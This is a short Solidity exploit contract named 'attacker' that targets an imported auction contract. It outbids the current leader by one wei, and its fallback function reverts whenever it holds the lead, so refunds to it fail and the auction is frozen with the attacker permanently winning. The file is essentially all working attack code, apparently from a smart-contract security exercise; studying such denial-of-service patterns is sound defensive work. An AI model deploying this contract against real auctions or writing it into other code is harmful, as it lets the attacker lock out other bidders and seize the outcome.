pragma solidity ^0.4.10;

import "./auction.sol";

contract attacker {
    auction auc;
        
    function attacker() public payable {}

    function attack(address addr) public  {
        auc = auction(addr);
        
        uint val = auc.getHighestBid();
        auc.bid.value(val + 1)();
    }
    
    function() payable public {
        if (auc.getCurrentLeader() == address(this)) revert();
    }
    
}